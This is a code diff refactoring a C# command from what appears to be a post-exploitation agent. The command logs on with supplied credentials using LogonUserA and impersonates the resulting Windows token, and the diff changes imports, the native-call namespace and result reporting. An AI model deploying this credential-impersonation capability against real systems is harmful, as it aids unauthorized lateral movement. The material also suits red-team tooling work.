@@ -1,16 +1,9 @@
 ﻿using Agent.Commands;
 using Agent.Helpers;
 using Agent.Models;
+using Pinvoke;
 using System;
-using System.Collections.Generic;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.IO;
-using System.Linq;
 using System.Security.Principal;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace Commands
 {
@@ -28,21 +21,21 @@ namespace Commands
             var username = split[1];
 
             IntPtr hToken = IntPtr.Zero;
-            if (Agent.Native.Advapi.LogonUserA(username, domain, password, Agent.Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS, Agent.Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
+            if (Advapi.LogonUserA(username, domain, password, Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS, Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
             {
-                if (Agent.Native.Advapi.ImpersonateLoggedOnUser(hToken))
-                   {
+                if (Advapi.ImpersonateLoggedOnUser(hToken))
+                {
                     var identity = new WindowsIdentity(hToken);
-                    context.Result.Result += $"Successfully impersonated {identity.Name}";
+                    context.AppendResult($"Successfully impersonated {identity.Name}");
                     ImpersonationHelper.Impersonate(hToken);
                     return;
                 }
 
-                context.Result.Result += $"Successfully made token but failed to impersonate";
+                context.Error($"Successfully made token but failed to impersonate");
                 return;
             }
 
-            context.Result.Result += $"Failed to make token";
+            context.Error($"Failed to make token");
             return;
         }
     }
